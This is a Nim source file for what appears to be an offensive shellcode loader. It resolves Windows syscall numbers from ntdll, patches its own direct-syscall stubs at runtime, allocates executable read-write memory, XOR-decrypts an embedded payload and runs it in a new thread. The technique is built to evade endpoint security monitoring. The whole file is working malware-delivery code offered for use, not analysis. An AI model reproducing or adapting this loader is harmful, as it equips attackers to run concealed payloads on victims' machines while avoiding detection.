import winim/lean
import ../crypto/exor/xorro

proc NtAllocateVirtualMemory(
        ProcessHandle: HANDLE,
        BaseAddress: PVOID,
        ZeroBits: SIZE_T,
        RegionSize: PSIZE_T,
        AllocationType: ULONG,
        Protect: ULONG): NTSTATUS {.asmNoStackFrame.} =
    asm """
        .intel_syntax noprefix
        mov r10, rcx
        mov eax, 0x90
        syscall
        ret
    """

proc NtProtectVirtualMemory(
        ProcessHandle: HANDLE,
        BaseAddress: PVOID,
        NumbersOfBytesToProtect: SIZE_T,
        NewAccessProtection: ULONG,
        OldAddressProtection: PULONG
    ): NTSTATUS {.asmNoStackFrame.} =
    asm """
        .intel_syntax noprefix
        mov r10, rcx
        mov eax, 0x90
        syscall
        ret
    """

# Using NtCreateThreadEx because NtCreateThread is deprecated and a pain in the
# butt with the PINITIAL_TEB structure...
proc NtCreateThreadEx(
        ThreadHandle: ptr HANDLE,
        DesiredAccess: ACCESS_MASK,
        ObjectAttributes: ptr OBJECT_ATTRIBUTES,
        ProcessHandle: HANDLE,
        StartRoutine: pointer,
        Argument: pointer,
        CreateFlags: ULONG,
        ZeroBits: SIZE_T,
        StackSize: SIZE_T,
        MaximumStackSize: SIZE_T,
        AttributeList: pointer): NTSTATUS {.asmNoStackFrame.} =
    asm """
        .intel_syntax noprefix
        mov r10, rcx
        mov eax, 0x90
        syscall
        ret
    """

proc NtWaitForSingleObject(
        Handle: HANDLE,
        Alterable: BOOLEAN,
        Timeout: PLARGE_INTEGER): NTSTATUS {.asmNoStackFrame.} =
    asm """
        .intel_syntax noprefix
        mov r10, rcx
        mov eax, 0x90
        syscall
        ret
    """

proc fixSSN(syscallNumber: int, fun: pointer) =
    if fun == nil:
        raise newException(OSError, "Function is NULL!")

    var counter = 0
    var bytes: array[64, byte]

    copyMem(addr bytes[0], fun, 64)

    for i in 0..<64:
        if bytes[i] == 0xb8:
            break

        counter += 1
    
    var ssubPtr = cast[pointer](cast [int](fun) + counter + 1)

    if ssubPtr == nil:
        raise newException(OSError, "NIL!")

    var bytesWritten: SIZE_T

    if WriteProcessMemory(
            GetCurrentProcess(),
            ssubPtr,
            unsafeAddr syscallNumber,
            1,
            addr bytesWritten) == 0:
        let err = GetLastError()

        raise newException(OSError, $err)

proc getSyscallNum(funcName: string): int =
    let ntdll = LoadLibrary("ntdll.dll")

    if ntdll == 0:
        raise newException(OSError, "[!] Failed load NTDLL.DLL!")

    let address = GetProcAddress(ntdll, funcName)

    if address == nil:
        raise newException(OSError, "[!] Function not found!")

    var bytes: array[64, byte]

    copyMem(addr bytes[0], address, 64)

    for i in 0..<64:
        if bytes[i] == 0xb8:
            return cast[int](bytes[i + 1])

    raise newException(OSError, "[!] Syscall number not found!")

proc loadPayload(
        payload: pointer,
        payload_len: int,
        key: string) =
    
    var syscallNum: int = getSyscallNum("NtAllocateVirtualMemory")
    fixSSN(syscallNum, NtAllocateVirtualMemory)

    # Not needed ATM since we are direct syscalling NtAllocateVirtualMemory
    # PAGE_EXECUTE_READWRITE because we DGAF. Still, could be handy one day...
    #syscallNum = getSyscallNum("NtProtectVirtualMemory")
    #fixSSN(syscallNum, NtProtectVirtualMemory)

    syscallNum = getSyscallNum("NtCreateThreadEx")
    fixSSN(syscallNum, NtCreateThreadEx)

    syscallNum = getSyscallNum("NtWaitForSingleObject")
    fixSSN(syscallNum, NtWaitForSingleObject)

    echo "[*] Allocating executable memory..."

    var baseAddr: PVOID
    var regionSize: SIZE_T = payload_len

    let status = NtAllocateVirtualMemory(
        cast[HANDLE](-1),
        addr baseAddr,
        0,
        addr regionSize,
        MEM_COMMIT or MEM_RESERVE,
        PAGE_EXECUTE_READWRITE)

    if status != 0:
        raise newException(OSError, "[!] Failed to allocate memory!")

    echo "[*] Decrypting payload"

    discard xorro(toOpenArray(
            cast[ptr UncheckedArray[byte]](payload),
            0,
            payload_len),
        key)

    echo "[*] Writing payload to memory..."

    copyMem(baseAddr, payload, payload_len)

    if baseAddr == nil:
        raise newException(OSError, "[!] baseAddr is nil!")

    echo "[*] Creating thread..."

    var hThread: HANDLE

    let threadStatus = NtCreateThreadEx(
            addr hThread,
            THREAD_ALL_ACCESS,
            nil,
            cast[HANDLE](-1),
            baseAddr,
            nil,
            0,
            0, 0, 0,
            nil)

    if threadStatus != 0:
        raise newException(OSError, "[!] Create Thread failed with " &
                GetLastError().toHex())

    echo "[+] Thread created successfully. Waiting for execution..."

    let waitStatus = NtWaitForSingleObject(
            hThread,
            1,
            nil)

    if waitStatus != 0:
        raise newException(OSError, "[!] Wait failed with: " & GetLastError().toHex())

    VirtualFree(baseAddr, 0, MEM_RELEASE)

    CloseHandle(hThread)

    echo "[*] Done"

export loadPayload
